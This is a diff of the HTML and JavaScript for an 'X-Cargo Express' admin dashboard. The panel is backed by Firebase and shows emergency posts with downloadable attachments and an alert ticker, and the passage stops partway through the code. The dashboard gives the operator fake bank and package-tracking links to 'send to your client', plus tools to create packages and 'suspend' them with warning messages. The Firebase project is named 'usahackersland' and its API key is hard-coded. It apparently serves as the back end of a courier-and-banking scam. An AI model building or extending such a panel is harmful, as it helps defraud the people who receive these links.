@@ -1,647 +1,179 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Admin Dashboard Home — X-Cargo Express</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard — X-Cargo Express</title>
 <style>
-  /* --- Dashboard base --- */
-  :root { --em-color: #ff3333; }
-  body { font-family: Arial, sans-serif; background:#000; color:lime; margin:0; padding:20px; }
-  .top-mobile { width:320px; max-width:100%; margin:0 auto 18px auto; border-radius:18px; overflow:hidden; box-shadow:0 8px 30px rgba(0,0,0,0.6); }
-  .mobile-screen {
-    background:#111; color:var(--em-color); padding:12px; height:420px; overflow:auto;
-    border:4px solid rgba(255,0,0,0.15);
-  }
-  .mobile-header { display:flex; align-items:center; justify-content:space-between; gap:8px; margin-bottom:8px; }
-  .mobile-title { font-weight:900; color:var(--em-color); }
-  .mobile-controls { display:flex; gap:6px; align-items:center; }
-  .mobile-controls button { background:var(--em-color); color:#000; border:none; padding:8px 10px; border-radius:8px; cursor:pointer; font-weight:700; }
-  .post { background:#0b0b0b; border-radius:12px; padding:10px; margin-bottom:12px; color:#fff; box-shadow:0 4px 10px rgba(0,0,0,0.6); }
-  .post .meta { font-size:12px; color:#9fd89f; margin-bottom:6px; display:flex; justify-content:space-between; gap:8px; align-items:center; }
-  .post img { max-width:100%; border-radius:8px; margin-top:8px; }
-  .post .download { display:inline-block; margin-top:8px; padding:8px 12px; border-radius:8px; background:#28a745; color:#fff; text-decoration:none; font-weight:700; }
-  .post .admin-actions { margin-top:8px; display:flex; gap:6px; }
-  .post .del-btn { background:#dc3545; border:none; color:#fff; padding:6px 8px; border-radius:6px; cursor:pointer; }
+:root { --em-color:#ff3333; }
+body { font-family: Arial,sans-serif; margin:0; padding:20px; background:#000; color:lime; }
 
-  /* --- Popup overlay (center) --- */
-  #popupOverlay {
-    position: fixed; inset: 0; display: none; align-items:center; justify-content:center;
-    background: rgba(0,0,0,0.75); z-index: 99999;
-  }
-  #popupBox {
-    width: min(880px, 92%); max-height: 85vh; overflow:auto;
-    background:#111; border-radius:14px; padding:18px;
-    border: 4px solid var(--em-color);
-    box-shadow: 0 10px 40px rgba(0,0,0,0.6), 0 0 18px var(--em-color);
-    color: #fff;
-  }
-  #popupBox h2 { margin:0 0 10px 0; color:var(--em-color); font-size:20px; display:flex; justify-content:space-between; align-items:center; }
-  #popupBox h2 .close-x { background:#222; color:#fff; padding:4px 8px; border-radius:8px; cursor:pointer; font-weight:800; }
-  #popupContent { color: #fff; text-align:left; line-height:1.4; }
-  #popupContent p { margin:8px 0; color:var(--em-color); font-weight:700; }
-  #popupContent img { display:block; max-width:100%; border-radius:10px; margin-top:12px; }
-  #popupFooter { margin-top:12px; display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
+/* --- Mobile screen posts --- */
+body::before {
+  content:""; position:fixed; inset:0; background:#111; opacity:0.4; z-index:0;
+}
+.top-mobile {
+  position:relative; z-index:1;
+  width:90%; max-width:1200px; margin:20px auto; border-radius:18px;
+  overflow:hidden; box-shadow:0 8px 30px rgba(0,0,0,0.6);
+}
+.mobile-screen {
+  background:#111; color:var(--em-color); padding:16px; height:280px;
+  overflow:auto; border:4px solid rgba(255,0,0,0.15);
+}
+.mobile-header { display:flex; align-items:center; justify-content:space-between; gap:8px; margin-bottom:8px; }
+.mobile-title { font-weight:900; font-size:20px; color:var(--em-color); }
 
-  /* Admin post form */
-  .admin-post { max-width:720px; margin:12px auto 24px; background:#0c0c0c; padding:12px; border-radius:12px; border:1px solid rgba(255,255,255,0.03); }
-  .admin-post input[type="text"], .admin-post textarea { width:100%; padding:8px; margin:6px 0; border-radius:8px; border:1px solid #333; background:#111; color:lime; }
-  .admin-post input[type="file"] { color: #fff; margin-top:6px; }
-  .admin-post .row { display:flex; gap:8px; align-items:center; }
-  .admin-post .small { width:35%; }
-  .admin-post .btn { padding:10px 12px; border-radius:8px; border:none; cursor:pointer; }
+.post {
+  background:#0b0b0b; border-radius:12px; padding:10px; margin-bottom:10px;
+  color:#fff; box-shadow:0 4px 10px rgba(0,0,0,0.6);
+}
+.post .meta { font-size:12px; color:#9fd89f; margin-bottom:6px; display:flex; justify-content:space-between; gap:8px; align-items:center; }
+.post img { max-width:100%; border-radius:8px; margin-top:8px; }
+.post .download { display:inline-block; margin-top:8px; padding:8px 12px; border-radius:8px; background:#28a745; color:#fff; text-decoration:none; font-weight:700; }
 
-  /* --- Top Ticker / Marquee & Siren --- */
-  #tickerWrap { position: fixed; top: 0; left: 0; right: 0; height:42px; display:none; align-items:center; z-index:99990; pointer-events:none; }
-  #ticker { display:flex; align-items:center; height:42px; overflow:hidden; width:100%; background: rgba(0,0,0,0.6); border-bottom:3px solid var(--em-color); }
-  #tickerInner { white-space:nowrap; display:inline-block; padding-left:100%; animation: scroll-left 18s linear infinite; color:var(--em-color); font-weight:700; font-size:16px; pointer-events:auto; }
-  @keyframes scroll-left { from { transform:translateX(0%);} to { transform:translateX(-100%);} }
-  #sirenBar { display:none; width:100%; height:42px; align-items:center; justify-content:center; gap:10px; color:#fff; font-weight:800; pointer-events:none; }
-  .siren-flash { width:20px; height:20px; border-radius:4px; box-shadow:0 0 8px rgba(255,0,0,0.8); }
-  .siren-flash.left { background:#ff2d2d; animation: flashRed 1s infinite; }
-  .siren-flash.right { background:#1e90ff; animation: flashBlue 1s infinite; }
-  @keyframes flashRed { 0%{opacity:1}50%{opacity:0.25}100%{opacity:1} }
-  @keyframes flashBlue { 0%{opacity:0.25}50%{opacity:1}100%{opacity:0.25} }
+/* --- Dashboard grid --- */
+.dashboard-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:18px; position:relative; z-index:1; }
+.dashboard-section { background:#111; border-radius:12px; padding:20px; box-shadow:0 2px 8px rgba(0,0,0,0.4); color:lime; text-align:center; }
+.link-box { background:#000; padding:8px; border:1px solid lime; border-radius:6px; margin-bottom:5px; font-size:14px; word-break:break-all; color:lime; }
+.link-desc { font-size:13px; color:#adff2f; margin-bottom:8px; text-align:left; }
+.btn-lime { background:lime; color:black; padding:10px 12px; border-radius:8px; border:none; cursor:pointer; margin-bottom:6px; }
+.btn-green { background:green; color:white; padding:10px 12px; border-radius:8px; border:none; cursor:pointer; margin-bottom:6px; }
+.btn-copy { background:#333; color:lime; border:1px solid lime; padding:8px 10px; border-radius:8px; cursor:pointer; margin-bottom:6px; }
 
-  /* layout sections below the mobile */
-  .dashboard-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:18px; }
-  .dashboard-section { background:#111; border-radius:12px; padding:20px; box-shadow:0 2px 8px rgba(0,0,0,0.4); color:lime; text-align:center; }
-  .link-box { background:#000; padding:8px; border:1px solid lime; border-radius:6px; margin-bottom:5px; font-size:14px; word-break:break-all; color:lime; }
-  .link-desc { font-size:13px; color:#adff2f; margin-bottom:8px; }
-  .btn-lime { background:lime; color:black; padding:10px 12px; border-radius:8px; border:none; }
-  .btn-green { background:green; color:white; padding:10px 12px; border-radius:8px; border:none; }
-  .btn-copy { background:#333; color:lime; border:1px solid lime; padding:8px 10px; border-radius:8px; }
-
-  .hidden { display:none !important; }
-  body.with-ticker { padding-top: 42px; box-sizing: border-box; }
+/* --- Top-right corner ticker --- */
+#cornerTicker {
+  position: fixed; top:20px; right:20px; width:350px; max-width:90%;
+  height:50px; background: rgba(0,0,0,0.85); color: var(--em-color);
+  border:2px solid var(--em-color); border-radius:12px; display:flex; align-items:center;
+  z-index: 99999; font-weight:700; font-size:14px; cursor:pointer; box-shadow:0 4px 12px rgba(0,0,0,0.6); overflow:hidden;
+}
+.siren-flash { width:18px; height:18px; margin:0 4px; border-radius:4px; display:inline-block; vertical-align:middle; }
+.siren-flash.left { background:#ff2d2d; animation: flashRed 1s infinite; box-shadow:0 0 8px #ff2d2d; }
+.siren-flash.right { background:#1e90ff; animation: flashBlue 1s infinite; box-shadow:0 0 8px #1e90ff; }
+@keyframes flashRed {0%,100%{opacity:1}50%{opacity:0.25}}
+@keyframes flashBlue {0%,100%{opacity:0.25}50%{opacity:1}}
+#cornerTickerInner { display:flex; align-items:center; white-space: nowrap; padding-left:100%; animation: cornerScroll 12s linear infinite; }
+#cornerTickerInner img { height:32px; width:32px; object-fit:cover; border-radius:6px; margin-right:6px; }
+@keyframes cornerScroll { 0% { transform: translateX(0%); } 100% { transform: translateX(-100%); } }
+.hidden { display:none !important; }
 </style>
 </head>
 <body>
 
-<!-- Embedded "mobile screen" messages box (on top of content) -->
-<div class="top-mobile" aria-hidden="false">
+<!-- Mobile screen posts -->
+<div class="top-mobile">
   <div class="mobile-screen" id="mobileScreen">
     <div class="mobile-header">
       <div class="mobile-title">📣 Emergency Posts</div>
-      <div class="mobile-controls" id="mobileControls">
-        <!-- Admin-only post button (shown dynamically) -->
-      </div>
     </div>
-
-    <!-- Posts list -->
     <div id="postsList">
-      <!-- posts inserted here -->
       <div style="color:#999; text-align:center; padding:30px 0;">Loading posts...</div>
     </div>
   </div>
 </div>
 
-<!-- Admin post form (only visible to admin) -->
-<div class="admin-post hidden" id="adminPostForm">
-  <h3 style="color:var(--em-color);">📝 Create Emergency Post</h3>
-  <label>Message text</label>
-  <textarea id="postText" rows="3" placeholder="Write message..."></textarea>
-
-  <div style="margin-top:8px;">
-    <label>Image (optional)</label>
-    <input type="file" id="postImage" accept="image/*">
-  </div>
-
-  <div style="margin-top:8px;">
-    <label>File to attach (optional) — apk, zip, rar, pdf, html, etc.</label>
-    <input type="file" id="postFile">
-  </div>
-
-  <div style="margin-top:8px;">
-    <label>Visible color (post highlight border)</label>
-    <input type="color" id="postColor" value="#ff3333">
-  </div>
-
-  <div style="margin-top:10px; display:flex; gap:8px;">
-    <button id="publishPost" class="btn btn-lime">Publish Post</button>
-    <button id="cancelPost" class="btn btn-green">Cancel</button>
-  </div>
-</div>
-
-<!-- Popup overlay -->
-<div id="popupOverlay" aria-hidden="true">
-  <div id="popupBox" role="dialog" aria-labelledby="popupTitle">
-    <h2 id="popupTitle">
-      <span>🚨 Emergency Alert</span>
-      <span class="close-x" id="popupCloseX">✕</span>
-    </h2>
-    <div id="popupContent">Loading...</div>
-    <div id="popupFooter">
-      <div style="display:flex;gap:8px;align-items:center;">
-        <button id="closePopup" class="btn-lime">Close</button>
-        <a id="popupLink" class="btn-lime hidden" href="#" target="_blank">Open Link</a>
-      </div>
-      <div class="admin-controls hidden" id="popupAdmin">
-        <label style="color:#fff;font-weight:700;margin-right:6px;">Popup Color</label>
-        <input type="color" id="adminColorPicker" value="#ff3333" title="Emergency color (saves to Firestore)">
-        <button id="editPopup" class="btn">✏️ Edit</button>
-        <button id="deletePopup" class="btn">🗑️ Delete</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- Ticker / Siren area (top) -->
-<div id="tickerWrap" class="hidden">
-  <div id="ticker">
-    <div id="tickerInner" aria-hidden="true"></div>
-  </div>
-  <div id="sirenBar" class="hidden">
-    <div class="siren-flash left"></div>
-    <div id="sirenText"></div>
-    <div class="siren-flash right"></div>
-  </div>
-</div>
-
-<!-- Dashboard content (Bank & Track Package sections) -->
+<!-- Dashboard -->
 <div class="dashboard-grid">
+
   <div class="dashboard-section">
     <h2>🏛️ BANK</h2>
-    <p>Copy this link and send to your client:</p>
+    <p class="link-desc">Copy this link and send to your client:</p>
     <div class="link-box" id="bankLink">https://bulksms4.github.io/BANKING/</div>
-    <div class="link-desc">➡️ This is the link you send to clients for banking services.</div>
     <button class="btn-copy" data-copy="bankLink">📋 Copy</button>
-    <p>Open account here to register:</p>
-    <div class="link-desc">👉 Click to open the registration page to start creating a client account.</div>
+
+    <p class="link-desc">Open account here to register:</p>
+    <div class="link-desc">Click to open the registration page to start creating a client account.</div>
     <button class="btn-lime" data-url="https://sp0m.com">Open Account</button>
-    <p>Credit your bank account:</p>
-    <div class="link-desc">➡️ Click this to add credit to your account to simulate transactions.</div>
-    <button class="btn-green" data-url="https://bulksms4.github.io/BANKING/create-account.html">💵💰 Credit your bank account 🪙</button>
+
+    <p class="link-desc">Credit your bank account:</p>
+    <div class="link-desc">Click this to add credit to your account to simulate transactions.</div>
+    <button class="btn-green" data-url="https://bulksms4.github.io/BANKING/create-account.html">💵💰 Credit Account</button>
   </div>
 
   <div class="dashboard-section">
     <h2>✈️🚢 Track Package 🛍️🛒</h2>
-    <p>Copy the link below and send to your client:</p>
+    <p class="link-desc">Copy the link below and send to your client:</p>
     <div class="link-box" id="trackLink">https://x-cargo-exprees.web.app/</div>
-    <div class="link-desc">👉 Give this link to your client to track the package you send.</div>
     <button class="btn-copy" data-copy="trackLink">📋 Copy</button>
-    <p>Open the account to create packages:</p>
-    <div class="link-desc">📦 Creating anything that concerns packages for your client.</div>
-    <button class="btn-lime" data-url="https://bulksms4.github.io/x-cargo-exprees/create.html">📦 Click here to Create Package</button>
-    <p>Update the package status:</p>
-    <div class="link-desc">⚠️ Suspend a package or send warning messages to your client package.</div>
-    <button class="btn-green" data-url="https://bulksms4.github.io/x-cargo-exprees/update-status.html">⚠️ Update Package / Suspend</button>
+
+    <p class="link-desc">Open the account to create packages:</p>
+    <div class="link-desc">Creating anything that concerns packages for your client.</div>
+    <button class="btn-lime" data-url="https://bulksms4.github.io/x-cargo-exprees/create.html">📦 Create Package</button>
+
+    <p class="link-desc">Update the package status:</p>
+    <div class="link-desc">Suspend a package or send warning messages to your client package.</div>
+    <button class="btn-green" data-url="https://bulksms4.github.io/x-cargo-exprees/update-status.html">⚠️ Update/Suspend</button>
   </div>
+
 </div>
 
-<!-- Firebase & Libraries -->
+<!-- Top-right corner ticker -->
+<div id="cornerTicker" title="Click for emergency link" onclick="if(emergencyLink) window.open(emergencyLink,'_blank')">
+  <span class="siren-flash left"></span>
+  <div id="cornerTickerInner">Loading emergency messages...</div>
+  <span class="siren-flash right"></span>
+</div>
+
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
 
 <script>
-/* ======================
-   CONFIG / CONSTANTS
-   ====================== */
-
+// Firebase init
 const firebaseConfig = {
-  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-  authDomain: "usahackersland.firebaseapp.com",
-  projectId: "usahackersland",
-  storageBucket: "usahackersland.appspot.com",
-  messagingSenderId: "588407428267",
-  appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
+  apiKey:"AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain:"usahackersland.firebaseapp.com",
+  projectId:"usahackersland",
+  storageBucket:"usahackersland.appspot.com",
+  messagingSenderId:"588407428267",
+  appId:"1:588407428267:web:7c4898cbb62efd3d5953ee"
 };
-
-if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
-const storage = firebase.storage();
-const auth = firebase.auth();
-
-/* ======================
-   ELEMENTS
-   ====================== */
 const postsList = document.getElementById('postsList');
-const mobileControls = document.getElementById('mobileControls');
-const adminPostForm = document.getElementById('adminPostForm');
-const publishPostBtn = document.getElementById('publishPost');
-const cancelPostBtn = document.getElementById('cancelPost');
-const postText = document.getElementById('postText');
-const postImage = document.getElementById('postImage');
-const postFile = document.getElementById('postFile');
-const postColor = document.getElementById('postColor');
+const cornerTickerInner = document.getElementById('cornerTickerInner');
+const cornerTicker = document.getElementById('cornerTicker');
+let emergencyLink = '';
 
-const popupOverlay = document.getElementById('popupOverlay');
-const popupBox = document.getElementById('popupBox');
-const popupContent = document.getElementById('popupContent');
-const closePopup = document.getElementById('closePopup');
-const popupLink = document.getElementById('popupLink');
-const popupCloseX = document.getElementById('popupCloseX');
-
-const popupAdmin = document.getElementById('popupAdmin');
-const adminColorPicker = document.getElementById('adminColorPicker');
-const editPopupBtn = document.getElementById('editPopup');
-const deletePopupBtn = document.getElementById('deletePopup');
-
-const tickerWrap = document.getElementById('tickerWrap');
-const tickerInner = document.getElementById('tickerInner');
-const sirenBar = document.getElementById('sirenBar');
-const sirenText = document.getElementById('sirenText');
-
-const urlParams = new URLSearchParams(window.location.search);
-const IS_ADMIN = urlParams.get('role') === 'admin';
-
-/* ======================
-   BEHAVIOR SETTINGS
-   ====================== */
-const POPUP_AUTO_SHOW_DELAY_MS = 10000;
-const POPUP_AUTO_HIDE_MS = 10000;
-const CLOSED_HIDE_MS = 30 * 60 * 1000;
-const SIREN_SWITCH_AFTER_MS = 30 * 60 * 1000;
-
-/* ======================
-   STATE
-   ====================== */
-let emergencyState = { text:'', image:'', phone:'', link:'', color:'#ff3333', timestamp:null };
-let closedUntil = Number(localStorage.getItem('emergencyPopupClosedUntil') || 0);
-let popupAutoHideTimer = null;
-let popupAutoShowTimer = null;
-let sirenSwitchTimer = null;
-
-/* ======================
-   UI Utilities
-   ====================== */
-function showPopup() {
-  document.documentElement.style.setProperty('--em-color', emergencyState.color || '#ff3333');
-  popupOverlay.style.display = 'flex';
-  popupOverlay.setAttribute('aria-hidden','false');
-  tickerWrap.classList.remove('hidden');
-  document.body.classList.add('with-ticker');
-}
-function hidePopup() {
-  popupOverlay.style.display = 'none';
-  popupOverlay.setAttribute('aria-hidden','true');
-}
-function setClosedFor30Min() {
-  closedUntil = Date.now() + CLOSED_HIDE_MS;
-  localStorage.setItem('emergencyPopupClosedUntil', String(closedUntil));
-}
-
-/* ======================
-   Render post list & helpers
-   ====================== */
-function createPostElement(id, data) {
-  const div = document.createElement('div');
-  div.className = 'post';
-  div.style.border = `2px solid ${data.color || '#333'}`;
-
-  const meta = document.createElement('div');
-  meta.className = 'meta';
-  const when = new Date(data.createdAt ? data.createdAt.seconds * 1000 : Date.now());
-  meta.innerHTML = `<div>${when.toLocaleString()}</div><div>${data.author || 'Admin'}</div>`;
-  div.appendChild(meta);
-
-  if (data.text) {
-    const p = document.createElement('div');
-    p.innerText = data.text;
-    div.appendChild(p);
-  }
-  if (data.imageURL) {
-    const img = document.createElement('img');
-    img.src = data.imageURL;
-    img.alt = 'post image';
-    div.appendChild(img);
-  }
-
-  // file download
-  if (data.fileURL) {
-    const a = document.createElement('a');
-    a.href = data.fileURL;
-    // try to set download attribute if same origin; often cross-origin prevents it -> still gives user open
-    a.setAttribute('download', '');
-    a.className = 'download';
-    a.innerText = data.fileName ? `⬇ Download ${data.fileName}` : '⬇ Download File';
-    div.appendChild(a);
-  }
-
-  if (IS_ADMIN) {
-    const adminActions = document.createElement('div');
-    adminActions.className = 'admin-actions';
-    const delBtn = document.createElement('button');
-    delBtn.className = 'del-btn';
-    delBtn.innerText = 'Delete Post';
-    delBtn.addEventListener('click', async () => {
-      if (!confirm('Delete this post?')) return;
-      try {
-        // if files exist in the document, delete from storage
-        if (data.imagePath) {
-          try { await storage.ref(data.imagePath).delete(); } catch(e){ console.warn('image delete err', e); }
-        }
-        if (data.filePath) {
-          try { await storage.ref(data.filePath).delete(); } catch(e){ console.warn('file delete err', e); }
-        }
-        await db.collection('emergencyPosts').doc(id).delete();
-      } catch (err) {
-        alert('Error deleting: ' + err.message);
-      }
-    });
-    adminActions.appendChild(delBtn);
-    div.appendChild(adminActions);
-  }
-
-  return div;
-}
-
-/* ======================
-   Listen for posts (emergencyPosts collection)
-   ====================== */
-db.collection('emergencyPosts').orderBy('createdAt','desc')
-  .onSnapshot(snapshot => {
-    postsList.innerHTML = '';
-    if (snapshot.empty) {
-      postsList.innerHTML = '<div style="color:#999; text-align:center; padding:30px 0;">No posts yet.</div>';
-      return;
-    }
-    snapshot.forEach(doc => {
-      const el = createPostElement(doc.id, doc.data());
-      postsList.appendChild(el);
-    });
-  }, err => {
-    postsList.innerHTML = `<div style="color:#f88; padding:16px;">Error loading posts: ${err.message}</div>`;
-  });
-
-/* ======================
-   Admin post publishing (uploads)
-   ====================== */
-function showAdminPostForm(show) {
-  if (show) adminPostForm.classList.remove('hidden'); else adminPostForm.classList.add('hidden');
-}
-
-if (IS_ADMIN) {
-  // show admin controls in mobile header
-  const postBtn = document.createElement('button');
-  postBtn.innerText = '+ Post';
-  postBtn.addEventListener('click', () => showAdminPostForm(true));
-  mobileControls.appendChild(postBtn);
-  showAdminPostForm(false);
-}
-
-/* helper to upload a file to Firebase Storage and return URL + path */
-async function uploadFileToStorage(file, folder = 'emergencyPosts') {
-  const path = `${folder}/${Date.now()}_${file.name.replace(/\s+/g,'_')}`;
-  const refStorage = storage.ref(path);
-  await refStorage.put(file);
-  const url = await refStorage.getDownloadURL();
-  return { url, path };
-}
-
-publishPostBtn && publishPostBtn.addEventListener('click', async () => {
-  const text = postText.value.trim();
-  const imgFile = postImage.files[0];
-  const file = postFile.files[0];
-  const color = postColor.value || '#ff3333';
-
-  if (!text && !imgFile && !file) {
-    alert('Provide text or image or file.');
-    return;
-  }
-
-  publishPostBtn.disabled = true;
-  publishPostBtn.innerText = 'Publishing...';
-
-  try {
-    let imageURL = '';
-    let imagePath = '';
-    let fileURL = '';
-    let filePath = '';
-    let fileName = '';
-
-    if (imgFile) {
-      const up = await uploadFileToStorage(imgFile, 'emergencyImages');
-      imageURL = up.url; imagePath = up.path;
-    }
-    if (file) {
-      const upf = await uploadFileToStorage(file, 'emergencyFiles');
-      fileURL = upf.url; filePath = upf.path; fileName = file.name;
-    }
-
-    await db.collection('emergencyPosts').add({
-      text,
-      imageURL: imageURL || '',
-      imagePath: imagePath || '',
-      fileURL: fileURL || '',
-      filePath: filePath || '',
-      fileName: fileName || '',
-      color,
-      author: 'Admin',
-      createdAt: firebase.firestore.FieldValue.serverTimestamp()
-    });
-
-    // clear form
-    postText.value = ''; postImage.value = ''; postFile.value = '';
-    showAdminPostForm(false);
-  } catch (err) {
-    alert('Publish error: ' + err.message);
-  } finally {
-    publishPostBtn.disabled = false;
-    publishPostBtn.innerText = 'Publish Post';
-  }
-});
-
-cancelPostBtn && cancelPostBtn.addEventListener('click', () => {
-  postText.value = ''; postImage.value = ''; postFile.value = '';
-  showAdminPostForm(false);
-});
-
-/* ======================
-   Popup / Ticker logic (uses 'emergency' doc)
-   ====================== */
-
-function renderPopupFromState() {
-  popupContent.innerHTML = '';
-  if (emergencyState.text) {
-    const p = document.createElement('p');
-    p.textContent = emergencyState.text;
-    popupContent.appendChild(p);
-  }
-  if (emergencyState.image) {
-    const img = document.createElement('img');
-    img.src = emergencyState.image;
-    img.alt = 'Emergency image';
-    popupContent.appendChild(img);
-  }
-  if (emergencyState.phone) {
-    const ph = document.createElement('p');
-    ph.innerHTML = '📞 <a style="color:var(--em-color);" href="tel:' + emergencyState.phone + '">' + emergencyState.phone + '</a>';
-    popupContent.appendChild(ph);
-  }
-  if (emergencyState.link) {
-    popupLink.href = emergencyState.link;
-    popupLink.classList.remove('hidden');
-  } else {
-    popupLink.classList.add('hidden');
-  }
-  // set CSS color var
-  document.documentElement.style.setProperty('--em-color', emergencyState.color || '#ff3333');
-}
-
-/* show/hide popup scheduling */
-function showAndAutoHidePopup() {
-  renderPopupFromState();
-  showPopup();
-  if (popupAutoHideTimer) clearTimeout(popupAutoHideTimer);
-  popupAutoHideTimer = setTimeout(() => {
-    hidePopup();
-  }, POPUP_AUTO_HIDE_MS);
-}
-
-function tryShowPopup(immediate=false) {
-  if (Date.now() < closedUntil) {
-    // suppressed for user
-    return;
-  }
-  if (popupAutoShowTimer) clearTimeout(popupAutoShowTimer);
-  if (immediate) showAndAutoHidePopup();
-  else popupAutoShowTimer = setTimeout(() => showAndAutoHidePopup(), POPUP_AUTO_SHOW_DELAY_MS);
-}
-
-/* Read main emergency doc */
-db.collection('emergency').doc('current')
-  .onSnapshot(doc => {
-    if (!doc.exists) {
-      emergencyState = { text:'', image:'', phone:'', link:'', color:'#ff3333', timestamp:null };
-      hidePopup();
-      // hide ticker
-      tickerWrap.classList.add('hidden');
-      return;
-    }
-    const data = doc.data();
-    emergencyState.text = data.text || '';
-    emergencyState.image = data.image || '';
-    emergencyState.phone = data.phone || '';
-    emergencyState.link = data.link || '';
-    emergencyState.color = data.color || '#ff3333';
-    emergencyState.timestamp = data.timestamp ? (data.timestamp.toMillis ? data.timestamp.toMillis() : data.timestamp) : Date.now();
-
-    // update popup/ticker
-    tryShowPopup(true);
-    // show ticker text
-    tickerInner.textContent = '   ' + (emergencyState.text || '') + '   ';
-    tickerInner.style.color = emergencyState.color;
-    tickerWrap.classList.remove('hidden');
-
-    // schedule siren mode
-    if (sirenSwitchTimer) clearTimeout(sirenSwitchTimer);
-    sirenSwitchTimer = setTimeout(() => {
-      // switch to siren bar
-      tickerInner.style.display = 'none';
-      sirenBar.style.display = 'flex';
-      sirenText.textContent = emergencyState.text || '';
-      document.body.classList.add('with-ticker');
-    }, SIREN_SWITCH_AFTER_MS);
-  });
-
-/* On page load behavior: if closedUntil is active, don't show popup but show ticker */
-window.addEventListener('load', () => {
-  if (Date.now() < closedUntil) {
-    db.collection('emergency').doc('current').get().then(doc => {
-      if (doc.exists) {
-        const d = doc.data();
-        emergencyState.text = d.text || '';
-        emergencyState.color = d.color || '#ff3333';
-        tickerInner.textContent = '   ' + emergencyState.text + '   ';
-        tickerInner.style.color = emergencyState.color;
-        tickerWrap.classList.remove('hidden');
-      }
-    });
-  } else {
-    // try show later (listener triggers immediate if there's a change)
-    // (no action needed)
-  }
-});
-
-/* Popup close actions */
-closePopup.addEventListener('click', () => {
-  hidePopup();
-  setClosedFor30Min();
-});
-popupCloseX.addEventListener('click', () => {
-  hidePopup();
-  setClosedFor30Min();
-});
-
-/* Admin popup controls */
-if (IS_ADMIN) {
-  popupAdmin.classList.remove('hidden');
-  popupAdmin.style.display = 'flex';
-  // prefill color from firestore
-  db.collection('emergency').doc('current').get().then(doc => {
-    if (doc.exists) {
-      const d = doc.data();
-      if (d.color) adminColorPicker.value = d.color;
-    }
-  });
-} else {
-  popupAdmin.classList.add('hidden');
-}
-
-adminColorPicker.addEventListener('input', async (e) => {
-  const c = e.target.value;
-  try {
-    await db.collection('emergency').doc('current').set({ color: c }, { merge: true });
-  } catch (err) { alert('Error saving color: ' + err.message); }
-});
-
-editPopupBtn.addEventListener('click', async () => {
-  const doc = await db.collection('emergency').doc('current').get();
-  const data = doc.exists ? doc.data() : {};
-  const newText = prompt('Edit emergency text:', data.text || '');
-  if (newText === null) return;
-  const newLink = prompt('Edit link (blank for none):', data.link || '');
-  if (newLink === null) return;
-  const newPhone = prompt('Edit phone (blank for none):', data.phone || '');
-  if (newPhone === null) return;
-  const imageUrl = prompt('Image URL (blank for none):', data.image || '');
-  if (imageUrl === null) return;
-  await db.collection('emergency').doc('current').set({
-    text: newText,
-    link: newLink || '',
-    phone: newPhone || '',
-    image: imageUrl || '',
-    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-  }, { merge: true });
-  alert('Emergency updated.');
-});
-
-deletePopupBtn.addEventListener('click', async () => {
-  if (!confirm('Delete current emergency?')) return;
-  await db.collection('emergency').doc('current').delete();
-  alert('Deleted.');
-});
-
-/* Copy / open buttons for the dashboard */
-document.querySelectorAll('.btn-copy').forEach(btn => {
-  btn.addEventListener('click', () => {
+// Copy links
+document.querySelectorAll('.btn-copy').forEach(btn=>{
+  btn.addEventListener('click',()=>{
     const id = btn.getAttribute('data-copy');
-    const txt = document.getElementById(id).innerText;
-    navigator.clipboard.writeText(txt).then(()=> alert('✅ Copied: ' + txt));
-  });
-});
-document.querySelectorAll('[data-url]').forEach(btn => {
-  btn.addEventListener('click', () => {
-    const url = btn.getAttribute('data-url');
-    window.open(url, '_blank');
+    const link = document.getElementById(id).textContent;
+    navigator.clipboard.writeText(link).then(()=>alert('Copied!'));
   });
 });
 
-/* Ticker click behavior */
-tickerInner.addEventListener('click', () => {
-  if (emergencyState.link) window.open(emergencyState.link, '_blank');
+// Open URL buttons
+document.querySelectorAll('.btn-lime,.btn-green').forEach(btn=>{
+  btn.addEventListener('click',()=>{ const url=btn.getAttribute('data-url'); if(url) window.open(url,'_blank'); });
 });
 
-/* Cleanup */
-window.addEventListener('beforeunload', () => {
-  if (popupAutoHideTimer) clearTimeout(popupAutoHideTimer);
-  if (popupAutoShowTimer) clearTimeout(popupAutoShowTimer);
-  if (sirenSwitchTimer) clearTimeout(sirenSwitchTimer);
-});
+// Listen for posts dynamically
+db.collection('emergencyPosts').orderBy('createdAt','desc').onSnapshot(snapshot=>{
+  postsList.innerHTML='';
+  snapshot.forEach(doc=>{
+    const data=doc.data();
+    const div=document.createElement('div'); div.className='post';
+    div.style.border=`2px solid ${data.color||'#ff3333'}`;
+    const meta=document.createElement('div'); meta.className='meta';
+    meta.innerHTML=`<div>${data.author||'Admin'}</div><div>${new Date(data.createdAt?.seconds*1000||Date.now()).toLocaleString()}</div>`;
+    div.appendChild(meta);
+    if(data.text){ const p=document.createElement('div'); p.innerText=data.text; div.appendChild(p);}
+    if(data.imageURL){ const img=document.createElement('img'); img.src=data.imageURL; div.appendChild(img);}
+    if(data.fileURL){ const a=document.createElement('a'); a.href=data.fileURL; a.innerText='⬇ Download'; a.className='download'; div.appendChild(a);}
+    postsList.prepend(div);
 
+    // Update ticker
+    cornerTickerInner.innerHTML='';
+    if(data.imageURL){ const img=document.createElement('img'); img.src=data.imageURL; cornerTickerInner.appendChild(img);}
+    const span=document.createElement('span'); span.textContent=' ⚠️ '+data.text+' ⚠️ ';
+    span.style.color=data.color||'#ff3333';
+    cornerTickerInner.appendChild(span);
+    emergencyLink=data.link||'';
